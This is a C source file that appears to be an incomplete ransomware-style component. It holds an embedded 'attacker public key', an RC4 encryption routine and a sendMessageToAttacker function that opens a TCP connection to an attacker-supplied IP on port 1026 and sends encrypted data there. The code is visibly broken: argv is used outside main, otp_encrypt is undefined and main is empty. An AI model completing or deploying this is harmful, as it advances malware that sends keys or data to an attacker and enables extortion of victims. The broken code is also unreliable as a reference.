#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <openssl/evp.h>

//RSA-2048 attacker public key.
char* publicKey = "MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQ"
                  "KCAQBVsejWJHjJO/VCu+vJj6QklpPbZODP+A4e"
                  "2ZYOf4sGt+ce/7+AP9YKFmaWAXhd1LOb9mfzng"
                  "RCNGIzJBNOssNBPJXie5wT7EbXKJ1YsH/3Efnp5"
                  "7DEWaeLe/LwIUfe2+ufzNIZhCKDdKSItFaSQ0yO"
                  "4ylXU8SCp6HxCGbdTw0EXat2wEs2vXRRXxG06Ej"
                  "fMjwSEnygr0WKBAzHHYOFm6dNnlZyisYupd1a2l"
                  "D9Ip5w/6lh9z2RRz4BoX9GI3XHW4mm+qeW2aF3i"
                  "6QdI2mu8CnjQIPilqcKabx2jX7n8wHgf0rUcQyj"
                  "7b3nEo1fBhtQO29VgffawI8uQian7Tg8Vk7xAgMBAAE=";

int stream_encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext)
{
    /* Declare cipher context */
    EVP_CIPHER_CTX *ctx;

    int len;
    int outLength = plaintext_len;

    /* Create and initialize the context */
    ctx = EVP_CIPHER_CTX_new();

    /* Initialize the encryption operation. */
    EVP_EncryptInit_ex(ctx, EVP_rc4(), NULL,key,iv);

    /* Provide the message to be encrypted, and obtain the encrypted output. EVP_EncryptUpdate can be called multiple times if necessary */
    EVP_EncryptUpdate(ctx, ciphertext, &outLength, plaintext, plaintext_len);


    /* Finalize the encryption. Further ciphertext bytes may be written at this stage. */
    EVP_EncryptFinal_ex(ctx,ciphertext,&outLength);

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);


    return outLength;
}

int sendMessageToAttacker(char* encryptedKey){

    int protocol = 6;//TCP Protocol
    int domain = AF_INET;
    int type = SOCK_STREAM;
    struct sockaddr_in server_address;


    int sockfd = socket(domain, type, protocol);
    if(sockfd == -1) {
        printf("ErrorCreatingSocket\n");
        return -1;
    }

    server_address.sin_family = domain;
    int portNumber = 1026;
    in_addr_t ipConverted = inet_addr(argv[1]);
    server_address.sin_addr.s_addr = ipConverted;
    server_address.sin_port = htons(portNumber);

    size_t size = sizeof(server_address);
    //connect to socket
    int retVal = connect(sockfd, (const struct sockaddr*) &server_address, size);
    if(retVal == -1) {
        printf("ErrorConnectingSocket\n");
        return -1;
    }

    // Get input from the user:
    size_t clientMsgSize = 100;
    unsigned char clientMessage[clientMsgSize];
    printf("Enter message sent to the server: ");
    fgets(clientMessage, clientMsgSize, stdin);

    size_t cipherLength = 101;
    unsigned char cipherText[cipherLength];

    if(argv[2][0] == '0'){
        printf("Encrypting use otp\n");
        otp_encrypt(clientMessage, argv[3],cipherText,clientMsgSize);
    }
    if(argv[2][0]== '1'){
        printf("Encrypting use stream cipher\n");
        int cipherLengthReal = stream_encrypt(clientMessage, clientMsgSize, argv[3], argv[4], cipherText);
    }
    if(argv[2][0] != '0' && argv[2][0] != '1'){
        printf("Encrypting use otp\n");
        otp_encrypt(clientMessage, argv[3],cipherText,clientMsgSize);
    }
    cipherText[100] = 0;
    printf("Client sends cipher text:\n");
    printf( "%s\n",cipherText);


// Send the message to server:
    ssize_t bytesSent = send(sockfd, cipherText, cipherLength, 0);
    if(bytesSent == -1) {
        printf("errorSending\n");
        return -1;
    }

// Receive the server's response:
    size_t inputBufferLength = 100;
    char inputBuffer[inputBufferLength];
    ssize_t bytesReceived = recv(sockfd, inputBuffer, inputBufferLength, 0);
    if(bytesReceived == -1){
        printf("errorReceive\n");
        return -1;
    }
    else printf("Server says: %s\n", inputBuffer);

// Close the socket:
    int retCloseVal = close(sockfd);
    if(retCloseVal == -1) {
        printf("ErrorClosing\n");
        return -1;
    }

}

int main(int argc, unsigned char** argv){




    return 0;

}
